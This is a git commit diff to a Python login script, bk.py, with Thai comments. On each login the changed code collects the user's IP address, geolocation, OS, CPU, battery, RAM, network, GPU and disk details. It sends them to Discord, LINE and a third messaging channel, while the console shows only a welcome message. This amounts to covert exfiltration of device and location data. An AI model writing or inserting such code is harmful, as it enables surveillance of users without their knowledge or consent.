6b8512540f55eb0de33b828625604680ba0b963f
earthkcc147 <145793741+earthkcc147@users.noreply.github.com>
2024-12-21 18:26:34 +0700

    Update bk.py

--- bk.py
+++ bk.py
@@ -9,7 +9,11 @@ from datetime import datetime
 
 from send.discord import send_discord_message, get_current_time
 from send.line import send_line_message, get_current_time
-from get.get import get_device_info  # นำเข้า get_device_info จาก get.py
+from send.disget import smdc, get_current_time
+
+from get.get import get_full_info  # นำเข้า get_device_info จาก get.py
+
+device_info = get_full_info()
 
 # เริ่มต้น colorama
 init(autoreset=True)
@@ -45,14 +49,32 @@ def clear_console():
 def print_welcome_message(username):
     print(Fore.GREEN + Style.BRIGHT + f"\nยินดีต้อนรับ {username}!\n")
     print(Fore.YELLOW + "เข้าสู่ระบบสำเร็จ ✅\n")
+
     message = (
         f"🎉 ผู้ใช้ {username} เข้าสู่ระบบสำเร็จ ✅\n"
         f"🕒 เวลา: {current_time}\n"
+        f"🖥️ อุปกรณ์ที่เข้าสู่ระบบ:\n"
+        f"📍 IP: {device_info['IP']}\n"
+        f"🌏 ตำแหน่ง: {device_info['Location']['city']}, {device_info['Location']['region']}, {device_info['Location']['country']}\n"
+        f"💻 ระบบปฏิบัติการ: {device_info['Device']['os']} {device_info['Device']['os_version']}\n"
+        f"🔧 CPU: {device_info['Device']['processor']} ({device_info['Device']['cpu_count']} cores)\n"
+        f"🔋 แบตเตอรี่: {device_info['Battery']}\n"
+        f"🖥️ ความละเอียดหน้าจอ: {device_info['Screen Resolution']}\n"
+
+        f"💾 RAM: {device_info['Device']['memory']} (Used: {device_info['Memory']['used']} GB, Free: {device_info['Memory']['free']} GB, Usage: {device_info['Memory']['percent']}%)\n"
+        f"🌐 เครือข่าย: {device_info['Network']}\n"
+
+        f"🖥️ ความละเอียดหน้าจอ: {device_info['Screen Resolution2']}\n"
+        f"💻 GPU: {device_info['GPU2']}\n"  # ข้อมูล GPU
+        f"💾 การใช้งานดิสก์: {device_info['Disk Usage2']}\n"  # ข้อมูลดิสก์
+
         "🔔 ยินดีต้อนรับเข้าสู่ระบบ!"
+
     )
     # ส่งข้อความไปยัง Discord และ Line
     send_discord_message(message)
     send_line_message(message)
+    smdc(message)
 
 # สร้างหน้าจอล็อคอินที่สวยงาม
 def login_screen():
